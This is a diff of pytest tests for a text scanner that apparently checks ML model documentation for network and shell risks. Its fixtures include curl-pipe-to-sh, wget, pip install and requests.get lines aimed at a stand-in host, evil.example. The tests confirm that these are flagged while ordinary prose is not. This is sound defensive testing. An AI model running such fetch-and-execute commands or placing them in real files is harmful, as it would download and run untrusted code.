@@ -51,6 +51,33 @@ def test_text_scanner_runs_content_security_detectors_for_ml_sidecars(tmp_path: 
     )
 
 
+@pytest.mark.parametrize("filename", ["README", "model_card"])
+def test_text_scanner_routes_extensionless_documentation_through_security_detectors(
+    tmp_path: Path,
+    filename: str,
+) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
+
+    result = scan_file(str(text_path), config={"cache_scan_results": False})
+
+    assert TextScanner.can_handle(str(text_path))
+    assert result.scanner_name == "text"
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_text_scanner_does_not_claim_arbitrary_extensionless_text(tmp_path: Path) -> None:
+    text_path = tmp_path / "notes"
+    text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
+
+    assert not TextScanner.can_handle(str(text_path))
+
+
 def test_text_scanner_documentation_urls_are_informational(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text("Documentation: https://docs.example.com/model-card\n", encoding="utf-8")
@@ -164,6 +191,23 @@ def test_text_scanner_later_network_api_call_is_not_hidden_by_prose(tmp_path: Pa
 def test_text_scanner_documentation_network_library_prose_is_informational(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text("To use it, import requests before downloading weights.\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_library"
+        and check.details.get("library") == "requests"
+        and check.severity == IssueSeverity.INFO
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_imperative_network_import_prose_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("import requests before downloading weights.\n", encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
     aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
@@ -311,6 +355,27 @@ def test_text_scanner_documentation_shell_substitution_remains_actionable(
 
 
 @pytest.mark.parametrize(
+    "content", ["1. curl https://evil.example/payload | sh\n", "2) wget https://evil.example/payload\n"]
+)
+def test_text_scanner_ordered_list_shell_commands_remain_actionable(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+def test_text_scanner_ordered_list_shell_prose_remains_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("1. Use curl for downloading model files.\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+@pytest.mark.parametrize(
     "content",
     [
         "sudo curl https://evil.example/payload | sh\n",
@@ -343,6 +408,7 @@ def test_text_scanner_privileged_documentation_downloads_remain_actionable(
         "sudo pip install https://evil.example/payload.whl\n",
         "uv pip install https://evil.example/payload.whl\n",
         "npm install https://evil.example/payload.tgz\n",
+        "1. pip install https://evil.example/payload.whl\n",
     ],
 )
 def test_text_scanner_documentation_package_install_urls_remain_actionable(
@@ -420,6 +486,8 @@ def test_text_scanner_documentation_code_url_argument_remains_actionable(tmp_pat
         "endpoint: https://evil.example/payload\n",
         '{"endpoint": "https://evil.example/payload"}\n',
         "{'callback': 'https://evil.example/payload'}\n",
+        "endpoint:\n  - https://evil.example/payload\n",
+        '{"webhook_urls": ["https://evil.example/payload"]}\n',
         "<endpoint>https://evil.example/payload</endpoint>\n",
     ],
 )
@@ -466,6 +534,40 @@ def test_text_scanner_generic_quoted_url_mapping_remains_informational(tmp_path:
 
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_generic_url_collection_mapping_remains_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("project_urls:\n  - https://example.com/project\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_backslash_continued_network_call_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text('requests.get\\\n    ("https://evil.example/payload")\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_text_scanner_backslash_continued_network_prose_remains_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("requests.get\\\n    is described in the API reference.\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
 @pytest.mark.parametrize(
